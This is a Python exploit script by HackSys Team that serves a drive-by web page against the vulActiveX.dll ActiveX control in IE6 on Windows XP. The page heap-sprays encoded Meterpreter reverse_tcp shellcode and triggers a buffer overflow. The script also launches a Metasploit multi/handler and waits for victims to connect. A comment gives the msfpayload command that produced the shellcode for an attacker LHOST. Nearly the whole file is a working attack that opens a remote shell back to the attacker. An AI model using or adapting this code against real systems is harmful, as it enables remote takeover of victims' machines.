#!/usr/bin/env python

#HackSys Team - Panthera
#Author: Ashfaq Ansari
#Email: hacksysteam@hotmail.com
#Website: http://hacksys.vfreaks.com/

#Thanks to:
#Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
#Peter Van Eeckhoutte (corelanc0d3r) https://www.corelan.be/
#Richard Brengle <brengle@charteRMI.net>

#This script has been tested on Windows XP SP3 IE 6 with BackTrack 5R1

import time, sys, subprocess
from BaseHTTPServer import HTTPServer
from BaseHTTPServer import BaseHTTPRequestHandler

try:
    import psyco
    psyco.full()
except ImportError:
    pass
  
#Color variables to be usd with print command
RED  = "\033[31m" # red
GREEN  = "\033[32m" # green
BLUE  = "\033[34m" # blue

#My Custom RequestHandler class
class myRequestHandler(BaseHTTPRequestHandler):
 try:
  def do_GET(self):
    self.printCustomHTTPResponse(200)
    
    if self.path == "/":
	target = self.client_address[0]
        self.wfile.write("""<html><head>""")
        self.wfile.write("""
        <title>vulActiveX.dll Heap Spray SEH Exploit</title>
	<object classid='clsid:C44CBF61-7844-4C4B-BC77-7643FD70848E' id='_vulActiveX'>
	</object>
	<script type="text/javascript" language="javascript">
	//==========================================//
	//       vulActiveX Heap Spraying SEH       //
	//                                          //
	//          HackSys Team - Panthera         //
	//        http://hacksys.vfreaks.com/       //
	//         hacksysteam@hotmail.com          //
	//                                          //
	//          Author: Ashfaq Ansari           //
	//      ashfaq_ansari1989@hotmail.com       //
	//                                          //
	//==========================================//

	//Heading
	heading = ("<h4><pre>" +
	"#########################################################<br>" +
	"#vulActiveX.dll ActiveX Buffer Overflow (Heap Spray SEH)#<br>" +
	"#########################################################<br>" +
	"                 HackSys Team - Panthera                 <br>" +
	"                  Author: Ashfaq Ansari                  <br>" +
	"                http://hacksys.vfreaks.com               <br>" +
	"                 hacksysteam@hotmail.com                 <br>" +
	"#########################################################<br>" +
	"#              Tested on WinXPSP3 with IE6              #<br>" +
	"#########################################################<br>" +
	"</pre></h4>");

	document.write(heading);
	//LHOST = <Attackers IP>
        //root@bt: ~#msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.96.128 R | 
        //msfencode -a x86 -c 10 -e x86/shikata_ga_nai -t js_le > /root/Desktop/meterpreter_js.txt

        shellcode = unescape('%udeda%u22b8%uf7be%ud9da%u2474%u5af4%uc931%u86b1%u4231%u0318%u1842%uea83' + 
                             '%u5cde%u6202%u04cd%u736f%u8528%u00a9%ufeee%uc214%u4f27%u25d7%ua4f1%u002b' + 
                             '%u47e9%u70c5%u1820%ufe20%u29ae%ua19c%u55eb%ud447%uadde%ua7fd%uad5c%ua4ff' + 
                             '%uc6f7%uc342%ub517%u9600%u4563%ua936%u89c0%uf82f%u06ef%u27c3%ub04d%u53ec' + 
                             '%u89e0%u809d%ue20b%ub12a%u69ab%u841a%u3c42%u5d40%ue496%udb30%u8ae0%uaba3' + 
                             '%ud9e0%u4a92%u6079%ub773%u84d4%ud4b7%u48ba%u3fd8%u2c0e%u523a%u4143%uc281' + 
                             '%u122c%u86da%ueddd%uf0fb%ud5f2%u1ed0%u5517%u8954%ue9cc%u6b52%u3ab8%u6a0b' + 
                             '%ucb3c%u3da8%ub650%u4e10%ua087%u5946%u02f8%u823c%ud1ee%u7b62%u4c80%u1d70' + 
                             '%u665b%u492e%u9fff%u2984%ub122%ua6da%u7e40%u39aa%ua713%u7bc6%u476a%u0c22' + 
                             '%u291b%u9bd1%u0415%u2200%u1f97%u8ef5%u5dfc%u9dd2%uba07%uadfa%u7ac2%u3577' + 
                             '%u6805%ueda9%udbb2%ud834%u43fd%ue600%udb3b%ub3b4%u5be6%u63dd%u14af%u9159' + 
                             '%ue9be%ub797%u5f4f%u5d15%u88cb%u3931%u80f5%u3dd1%uf807%uf2b6%ub24e%u1ae6' + 
                             '%u26d5%ua6e5%uf03a%u8eeb%uee47%u1168%ucf23%ud5b1%u5861%u4dc5%u3bff%uf4de' + 
                             '%ubfac%u96cb%ufa08%uc9b0%u388c%u1341%u6ba7%u6b41%u8488%uc896%u9e02%u55fb' + 
                             '%u9c47%u106a%ucf56%u63ce%u478d%ud139%uf2b5%u2ed0%u44fa%ubf51%uffb6%uda59' + 
                             '%u3945%u4ad1%uf908%u3460%ubb2e%u0509%u4585%u30f7%ufd04%u398a%u233e%u1871' + 
                             '%u4728%u3de7%uc1aa%u614b%u14e4%uda02%u6dbc%u691c%u29d2%u2a71%u64ee%uc39a' + 
                             '%udc62%u1e69%uaaad%u9762%ueef6%ue8f8%ub3fc%ube3b%u9b6a%u6369%u9de8%u8c0d' + 
                             '%uba32%u181b%u4766%u4337%u057c%u5b5d%u2efa%ued88%u7c5c%uf173%u432d%u3ed4' + 
                             '%ub73e%u3c05%u8c1b%u3112%u162a%uaf2a%uaf07%ue55a%u62ea%u1d48%ud0f8%u4a35' + 
                             '%u9b34%u1e37%u6b12%u1751%uc493%u4903%u877a%u7e0d%ubdd0%ua156%ud581%u0621' + 
                             '%u1e67%ub59c%u1b94%u7bed%u42cb%ufeb3%u5fb5%u7751%ue062%uc295%uedeb%u2fcc' + 
                             '%u2ed5%ue7de%u3e14%udd4f%u55c5%ub4b0%u1baf%uee54%u44f3%u6340%u31b1%u5534' + 
                             '%u5605%ufaf0%u7c83%u6e60');
    
        nops = unescape('%u9090%u9090');
        headersize = 20;

        //write the output to Internet Explorer's window
        document.write("<h2>vulActiveX.dll Heap Spray Attack</h2>");

        //create one block with nops
        document.write("Creating one block of memory with <b>NOPS</b>.</br>");
        slackspace = headersize + shellcode.length;
        while (nops.length < slackspace) nops += nops;
        fillblock = nops.substring(0, slackspace);

        //enlarge block with nops, size 0x50000
        document.write("Enlarging the memory with <b>NOPS</b> of size <b>0x5000</b>.</br>");
        block = nops.substring(0, nops.length - slackspace);
        while (block.length + slackspace < 0x50000) block = block + block + fillblock;

        document.write("Spraying <b>NOPS + SHELLCODE</b> <b>250</b> times.</br>");

        //spray 250 times : nops + shellcode
        memory = new Array();
        for (counter = 0; counter < 250; counter++) {
            memory[counter] = block + shellcode;

            //show the status of spray on Status bar
            window.status = "Spraying: " + Math.round(100 * counter / 250) + "% done";
        }

        document.write("Allocated <b>" + (block.length + shellcode.length).toString() + "</b> bytes.<br>");
        document.write("Heap Spraying completed successfully.<br>");
        document.write("Triggering vulnerability in <b>vulActiveX.dll</b>.<br>");
        window.status = "Launching Exploit";
        alert("Launching Exploit");

        evil_payload = "";
        while (evil_payload.length < 14356) evil_payload += unescape('%06');

        //pass the parameter to BufferOverflow method
        _vulActiveX.BufferOverflow(evil_payload);
	</script></head><body></body></html>""")
        
        print GREEN + ("\n\n[*] Victim IP Address: %s [*]" % (target))
        time.sleep(2)
        print GREEN + ("[*] Port Connected: 80 [*]")
        time.sleep(2)
        print RED + ("[*] Heap Spraying the victims browser [*]")
        time.sleep(2)
        print RED + ("[*] Please wait for Meterpreter sessions [*]")
        time.sleep(2)

    else :
      self.send_error(404,'FILE NOT FOUND')

  # Print custom HTTP Response messages
  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

 # In case of any exceptions, pass them
 except Exception:
    pass

# Bind to port 80
httpd = HTTPServer(('', 80), myRequestHandler)

# Print the Logo
print GREEN + ("""
 _    _            _     _____             _______                   
| |  | |          | |   / ____|           |__   __|                  
| |__| | __ _  ___| | _| (___  _   _ ___     | | ___  __ _ _ __ ___  
|  __  |/ _` |/ __| |/ /\___ \| | | / __|    | |/ _ \/ _` | '_ ` _ \ 
| |  | | (_| | (__|   < ____) | |_| \__ \    | |  __/ (_| | | | | | |
|_|  |_|\__,_|\___|_|\_\_____/ \__, |___/    |_|\___|\__,_|_| |_| |_|
                                __/ |                                
                               |___/                                 
""")

# Print Header
print GREEN + ("""
   ###############################################################
   #   vulActiveX.dll ActiveX Buffer Overflow (Heap Spray SEH)   #
   ###############################################################
   #                                                             #
   #                  Written by HackSys Team                    #
   #                  Author: Ashfaq Ansari                      #
   #                http://hacksys.vfreaks.com                   #
   #                 hacksysteam@hotmail.com                     #
   #                                                             #
   ###############################################################
   #             Tested on WinXP SP3 EN with IE6                 #
   ###############################################################
""")

print BLUE + ("[+] Starting vulActiveX.dll Buffer Overflow (Heap Spray SEH)")
time.sleep(2)
print GREEN + ("[+] Launching Meterpreter Multi Handler")
cmd = 'msfcli exploit/multi/handler LHOST=0.0.0.0 PAYLOAD=windows/meterpreter/reverse_tcp E'
subprocess.Popen([cmd], shell=True)
time.sleep(5)
print BLUE + ("[+] Waiting for Meterpreter Multi Handler to be ready")
time.sleep(20)
print GREEN + ("[+] Mini HTTP Server started and binded to port 80")
time.sleep(2)
print RED + ("[+] Waiting for victims to connect")
print RED + ("\n\nType CTRL+C to exit the exploit..")

try:
     # handle the connections
     httpd.handle_request()
     # Serve HTTP server forever
     httpd.serve_forever()
     
# Except Keyboard Interrupts and throw custom message
except KeyboardInterrupt:
       print RED + ("\n\nExiting exploit...\n\n")
       sys.exit(1)
        
